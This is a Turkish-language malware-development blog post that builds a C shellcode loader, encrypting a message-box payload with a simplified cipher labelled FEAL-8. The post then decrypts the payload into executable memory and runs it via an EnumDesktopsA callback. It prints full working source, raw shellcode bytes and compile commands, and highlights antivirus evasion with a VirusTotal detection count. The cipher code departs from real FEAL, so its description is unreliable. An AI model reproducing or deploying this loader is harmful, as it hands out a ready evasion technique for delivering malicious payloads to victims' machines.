\newpage
\subsection{95. malware and cryptography research - part 4 (32): encrypt payload via FEAL-8 algorithm. Simple C example.}

﷽

![kriptografi](./images/133/2024-09-12_18-03.png){width="80%"}     

Bu gönderi, kötü amaçlı yazılım geliştirmede FEAL-8 blok şifreleme yönteminin kullanımına dair kendi araştırmalarımın bir sonucudur. Her zamanki gibi, çeşitli kripto algoritmalarını keşfederken, bu yöntemi yük şifreleme ve şifre çözme amacıyla kullanırsak ne olacağını kontrol etmeye karar verdim.    

### FEAL

Bu algoritma, NTT Japonya'dan Akihiro Shimizu ve Shoji Miyaguchi tarafından geliştirildi. `64-bit` blok ve anahtar kullanılır. Amaç, DES'e benzer ancak daha güçlü bir tur fonksiyonuna sahip bir algoritma oluşturmaktı. Algoritma, daha az tur ile daha hızlı çalışabilir. Ne yazık ki, gerçeklik tasarım hedefleriyle örtüşmedi.     

Şifreleme işlemi, `64-bit`lik bir açık metin parçasıyla başlar. Öncelikle, veri bloğu `64-bit`lik anahtar ile `XOR` işlemine tabi tutulur. Ardından veri bloğu, sol ve sağ yarılara bölünür. Sol yarı, sağ yarı ile birleştirilerek yeni bir sağ yarı oluşturulur. Sol ve yeni sağ yarılar `n` turdan (başlangıçta dört) geçer. Her turda, sağ yarı `16-bit`lik anahtar materyaliyle (fonksiyon `f` aracılığıyla) birleştirilir ve ardından sol yarı ile `XOR`lanarak yeni sağ yarı oluşturulur. Yeni sol yarı, turun başlamasından önceki orijinal sağ yarıdan oluşur. `n` turun ardından (`n`inci turdan sonra sol ve sağ yarıları değiştirmemeyi unutmayın), sol yarı sağ yarı ile `XOR`lanarak yeni bir sağ yarı oluşturulur ve ardından `64-bit`lik tam bir blok oluşturmak için birleştirilir. Algoritma sona ermeden önce veri bloğu, başka bir `64-bit`lik anahtar materyali ile `XOR` işlemine tabi tutulur.      


### pratik örnek

Öncelikle `rotl` fonksiyonuna ihtiyacımız var:     

```cpp
// rotate left 1 bit
uint32_t rotl(uint32_t x, int shift) {
  return (x << shift) | (x >> (32 - shift));
}
```

Bu fonksiyon, `32-bit`lik bir işaretsiz tam sayı (`x`) üzerinde sola doğru bit düzeyinde bir döndürme işlemi gerçekleştirir. `x` değerinin bitleri, belirli bir pozisyon sayısı (`shift`) kadar sola kaydırılırken, sol tarafa taşan bitler sağ tarafa taşınır. Bit düzeyinde döndürmeler, kriptografik algoritmalarda yaygın olarak kullanılır ve verideki desenleri karıştırarak difüzyon sağlamaya yardımcı olur.     

Sıradaki fonksiyon `F` fonksiyonudur:     

```cpp
uint32_t F(u32 x1, u32 x2) {
  return rotl((x1 ^ x2), 2);
}
```

Bu fonksiyon, `FEAL-8` algoritmasının temel karıştırma fonksiyonudur. İki `32-bit`lik değer (`x1` ve `x2`) alır, bunlara bit düzeyinde `XOR` (`^`) uygular ve ardından sonucu daha önce tanımlanan `rotl` fonksiyonunu kullanarak `2-bit` sola döndürür. Bu işlem, şifreleme sürecinin doğrusal olmamasını artırmaya yardımcı olur.     

Sıradaki fonksiyon `G` fonksiyonudur:   

```cpp
// function G used in FEAL-8
void G(uint32_t* left, uint32_t* right, uint8_t* roundKey) {
  uint32_t tempLeft = *left;
  *left = *right;
  *right = tempLeft ^ F(*left, *right) ^ *(uint32_t*)roundKey;
}
```

`G` fonksiyonu, `FEAL-8` algoritmasındaki her turun ana dönüşüm fonksiyonudur. Veri bloğunun sol ve sağ yarıları üzerinde çalışır ve şu adımları gerçekleştirir:    
- Sol yarıyı geçici olarak kaydeder (`tempLeft`).     
- Sol yarıyı sağ yarıya eşitler (`*left = *right`).     
- Sağ yarıyı `tempLeft`, `F` fonksiyonunun sonucu ve tur anahtarının `XOR` işlemi ile günceller.     

Bu fonksiyon, `FEAL-8` algoritmasındaki her turda anahtar dönüşümlerini gerçekleştirir ve veri bloğunda gerekli difüzyon ve kafa karışıklığını (confusion) sağlar. `XOR` işlemi ve `F` fonksiyonu, veriyi karıştırarak şifrelemenin saldırılara karşı dayanıklı olmasını sağlar.     

Anahtar planlama fonksiyonu, ana şifreleme anahtarından (`key`) bir dizi tur alt anahtarı üretir. `FEAL-8`'in `8 turu`nun her biri için farklı bir alt anahtar oluşturur. Her turda, anahtar planlaması, anahtarın her baytı ile tur indeksi (`i`) ve bayt indeksi (`j`) toplamının `XOR` işlemini gerçekleştirir:    


```cpp
// key schedule for FEAL-8
void key_schedule(uint8_t* key) {
  for (int i = 0; i < ROUNDS; i++) {
    for (int j = 0; j < 8; j++) {
      K[i][j] = key[j] ^ (i + j);
    }
  }
}
```

Then, the next one is encryption logic:    

```cpp
// FEAL-8 encryption function
void feal8_encrypt(uint32_t* block, uint8_t* key) {
  uint32_t left = block[0], right = block[1];

  // perform 8 rounds of encryption
  for (int i = 0; i < ROUNDS; i++) {
    G(&left, &right, K[i]);
  }

  // final swapping of left and right
  block[0] = right;
  block[1] = left;
}
```

Bu fonksiyon, `FEAL-8` algoritmasını kullanarak `64-bit`lik bir veri bloğunu şifreler (iki `32-bit`lik yarıya bölünmüş: `left` ve `right`). Her turda uygun tur anahtarı ile `G` fonksiyonunu uygulayarak `8 tur` boyunca şifreleme işlemini gerçekleştirir.    

Şifre çözme mantığı:    

```cpp
// FEAL-8 decryption function
void feal8_decrypt(uint32_t* block, uint8_t* key) {
  uint32_t left = block[0], right = block[1];

  // perform 8 rounds of decryption in reverse
  for (int i = ROUNDS - 1; i >= 0; i--) {
    G(&left, &right, K[i]);
  }

  // final swapping of left and right
  block[0] = right;
  block[1] = left;
}
```

Ve shellcode şifreleme ve şifre çözme mantığı:    

```cpp
// function to encrypt shellcode using FEAL-8
void feal8_encrypt_shellcode(unsigned char* shellcode, int shellcode_len, 
uint8_t* key) {
  key_schedule(key);  // Generate subkeys
  int i;
  uint32_t* ptr = (uint32_t*)shellcode;
  for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
    feal8_encrypt(ptr, key);
    ptr += 2;
  }
  // handle remaining bytes by padding with 0x90 (NOP)
  int remaining = shellcode_len % BLOCK_SIZE;
  if (remaining != 0) {
    unsigned char pad[BLOCK_SIZE] = 
    { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
    memcpy(pad, ptr, remaining);
    feal8_encrypt((uint32_t*)pad, key);
    memcpy(ptr, pad, remaining);
  }
}

// function to decrypt shellcode using FEAL-8
void feal8_decrypt_shellcode(unsigned char* shellcode, int shellcode_len, 
uint8_t* key) {
  key_schedule(key);  // Generate subkeys
  int i;
  uint32_t* ptr = (uint32_t*)shellcode;
  for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
    feal8_decrypt(ptr, key);
    ptr += 2;
  }
  // handle remaining bytes with padding
  int remaining = shellcode_len % BLOCK_SIZE;
  if (remaining != 0) {
    unsigned char pad[BLOCK_SIZE] = 
    { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
    memcpy(pad, ptr, remaining);
    feal8_decrypt((uint32_t*)pad, key);
    memcpy(ptr, pad, remaining);
  }
}
```

İlk fonksiyon, verilen shellcode'u (`meow-meow` mesaj kutusu yükü) `FEAL-8` şifrelemesi kullanarak şifrelemekten sorumludur. Shellcode'u `64-bit`lik bloklar (`8 bayt`) halinde işler ve eğer tam bir bloğa sığmayan kalan baytlar varsa, bunları `0x90` (`NOP`) ile doldurarak şifreler.     

Son olarak, `main` fonksiyonu `FEAL-8` kullanarak shellcode'u şifreleme, çözme ve çalıştırma işlemlerini gösterir.    

Her zamanki gibi `meow-meow` mesaj kutusu payload'u kullandım:    

```cpp
unsigned char my_payload[] = 
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";
```

Ve şifresi çözülen payload, `EnumDesktopsA` fonksiyonu kullanılarak çalıştırılır.    

Tam kaynak kodu şu şekildedir (`hack.c`):    

```cpp
/*
 * hack.c
 * encrypt/decrypt payload via FEAL-8 algorithm
 * author: @cocomelonc
 * https://cocomelonc.github.io/malware/2024/09/12/malware-cryptography-32.html
 */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define ROUNDS 8    // FEAL-8 uses 8 rounds of encryption
#define BLOCK_SIZE 8  // FEAL-8 operates on 64-bit (8-byte) blocks

// subkeys generated from the main key
uint8_t K[ROUNDS][8];

// rotate left 1 bit
uint32_t rotl(uint32_t x, int shift) {
  return (x << shift) | (x >> (32 - shift));
}

// function F used in FEAL-8
uint32_t F(uint32_t x1, uint32_t x2) {
  return rotl((x1 ^ x2), 2);
}

// function G used in FEAL-8
void G(uint32_t* left, uint32_t* right, uint8_t* roundKey) {
  uint32_t tempLeft = *left;
  *left = *right;
  *right = tempLeft ^ F(*left, *right) ^ *(uint32_t*)roundKey;
}

// key schedule for FEAL-8
void key_schedule(uint8_t* key) {
  for (int i = 0; i < ROUNDS; i++) {
    for (int j = 0; j < 8; j++) {
      K[i][j] = key[j] ^ (i + j);
    }
  }
}

// FEAL-8 encryption function
void feal8_encrypt(uint32_t* block, uint8_t* key) {
  uint32_t left = block[0], right = block[1];

  // perform 8 rounds of encryption
  for (int i = 0; i < ROUNDS; i++) {
    G(&left, &right, K[i]);
  }

  // final swapping of left and right
  block[0] = right;
  block[1] = left;
}

// FEAL-8 decryption function
void feal8_decrypt(uint32_t* block, uint8_t* key) {
  uint32_t left = block[0], right = block[1];

  // perform 8 rounds of decryption in reverse
  for (int i = ROUNDS - 1; i >= 0; i--) {
    G(&left, &right, K[i]);
  }

  // final swapping of left and right
  block[0] = right;
  block[1] = left;
}

// function to encrypt shellcode using FEAL-8
void feal8_encrypt_shellcode(unsigned char* shellcode, int shellcode_len, 
uint8_t* key) {
  key_schedule(key);  // Generate subkeys
  int i;
  uint32_t* ptr = (uint32_t*)shellcode;
  for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
    feal8_encrypt(ptr, key);
    ptr += 2;
  }
  // handle remaining bytes by padding with 0x90 (NOP)
  int remaining = shellcode_len % BLOCK_SIZE;
  if (remaining != 0) {
    unsigned char pad[BLOCK_SIZE] = 
    { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
    memcpy(pad, ptr, remaining);
    feal8_encrypt((uint32_t*)pad, key);
    memcpy(ptr, pad, remaining);
  }
}

// function to decrypt shellcode using FEAL-8
void feal8_decrypt_shellcode(unsigned char* shellcode, int shellcode_len, 
uint8_t* key) {
  key_schedule(key);  // Generate subkeys
  int i;
  uint32_t* ptr = (uint32_t*)shellcode;
  for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
    feal8_decrypt(ptr, key);
    ptr += 2;
  }
  // handle remaining bytes with padding
  int remaining = shellcode_len % BLOCK_SIZE;
  if (remaining != 0) {
    unsigned char pad[BLOCK_SIZE] = 
    { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
    memcpy(pad, ptr, remaining);
    feal8_decrypt((uint32_t*)pad, key);
    memcpy(ptr, pad, remaining);
  }
}

int main() {
  unsigned char my_payload[] = 
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";

  int my_payload_len = sizeof(my_payload);
  int pad_len = my_payload_len + (BLOCK_SIZE - my_payload_len % BLOCK_SIZE) % 
  BLOCK_SIZE;
  unsigned char padded[pad_len];
  memset(padded, 0x90, pad_len);  // pad with NOPs
  memcpy(padded, my_payload, my_payload_len);

  printf("original shellcode:\n");
  for (int i = 0; i < my_payload_len; i++) {
    printf("%02x ", my_payload[i]);
  }
  printf("\n\n");

  uint8_t key[8] = { 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0 };

  feal8_encrypt_shellcode(padded, pad_len, key);

  printf("encrypted shellcode:\n");
  for (int i = 0; i < pad_len; i++) {
    printf("%02x ", padded[i]);
  }
  printf("\n\n");

  feal8_decrypt_shellcode(padded, pad_len, key);

  printf("decrypted shellcode:\n");
  for (int i = 0; i < my_payload_len; i++) {
    printf("%02x ", padded[i]);
  }
  printf("\n\n");

  // allocate and execute decrypted shellcode
  LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT, 
  PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, padded, my_payload_len);
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);

  return 0;
}
```

Bu örnek, `FEAL-8` şifreleme algoritmasının payload'u şifrelemek ve şifresini çözmek için nasıl kullanılacağını göstermektedir. Doğruluğu kontrol etmek için eklenen yazdırma mantığı bulunmaktadır.     

### demo

Şimdi her şeyi çalışırken görelim. Derleyelim (`linux` makinemde):      

```bash
x86_64-w64-mingw32-gcc -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc
```

![cryptography](./images/133/2024-09-12_18-04.png){width="80%"}      

Ardından, sadece mağdurun makinesinde (benim durumumda `Windows 11 x64`) çalıştırın:    

```powershell
.\hack.exe
```

![cryptography](./images/133/2024-09-13_02-48.png){width="80%"}      

Gördüğünüz gibi, her şey mükemmel çalıştı! =^..^=   

Shannon entropisini hesaplama:    

```bash
python3 entropy.py -f hack.exe
```

![cryptography](./images/133/2024-09-13_02-50.png){width="80%"}      

`.text` bölümündeki payload’umuz.    

Şimdi bu `hack.exe` dosyasını VirusTotal'a yükleyelim:     

![cryptography](./images/133/2024-09-13_02-54.png){width="80%"}      

[https://www.virustotal.com/gui/file/08a7fba2d86f2ca8b9431695f8b530be7ad546e3f7467978bd6ff003b7f9508c/detection](https://www.virustotal.com/gui/file/08a7fba2d86f2ca8b9431695f8b530be7ad546e3f7467978bd6ff003b7f9508c/detection)    

**Gördüğünüz gibi, 74 antivirüs motorundan sadece 25 tanesi dosyamızı zararlı olarak tespit etti.**     

### kriptoanaliz

Tarihsel olarak, dört turluk `FEAL-4`, seçilmiş açık metin saldırısı kullanılarak başarıyla analiz edildi ve tamamen kırıldı. Sean Murphy'nin daha sonraki yaklaşımı, bilinen ilk diferansiyel kriptanaliz saldırısıydı ve yalnızca `20` seçilmiş açık metin gerektiriyordu. Tasarımcılar, `8` turluk `FEAL` ile yanıt verdiler, ancak Biham ve Shamir, `SECURICOM '89` konferansında bunu analiz etti (*A. Shamir ve A. Fiat, "Method, Apparatus and Article for Identification and Signature," U.S. Patent #4,748,668, 31 Mayıs 1988*). `FEAL-8`'e karşı yapılan bir diğer seçilmiş açık metin saldırısı (*H. Gilbert ve G. Chase, "A Statistical Attack on the Feal–8 Cryptosystem," Advances in Cryptology—CRYPTO’90 Proceedings, Springer–Verlag, 1991, ss. 22–33*), sadece `10.000` blok kullanarak saldırıyı başarılı hale getirdi ve bu durum, yaratıcılarını `FEAL-N` olarak adlandırılan ve değişken sayıda tur içeren yeni bir versiyon tanımlamaya yöneltti (elbette `8` turdan fazla olacak şekilde).     

Biham ve Shamir, diferansiyel kriptanaliz kullanarak `FEAL-N`'i kaba kuvvet saldırısından (`2^64` seçilmiş açık metin şifrelemesiyle) daha hızlı kırmayı başardılar (`N < 32` için). `FEAL-16`, `2^28` seçilmiş açık metin veya `2^46.5` bilinen açık metinle kırılabiliyordu. `FEAL-8`, `2000` seçilmiş açık metin veya `2^37.5` bilinen açık metin ile kırılabiliyordu. `FEAL-4` ise yalnızca sekiz dikkatlice seçilmiş açık metinle kırılabiliyordu.     

Umarım bu gönderi, kötü amaçlı yazılım araştırmacıları, C/C++ programcıları için faydalı olur, bu ilginç şifreleme tekniği hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takımın cephaneliğine bir silah ekler.      

[FEAL-8 şifreleme](https://en.wikipedia.org/wiki/FEAL)      
[Kötü Amaçlı Yazılım ve Kriptografi 1](https://cocomelonc.github.io/malware/2023/08/13/malware-cryptography-1.html)      
[GitHub'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2024-09-12-malware-cryptography-32)
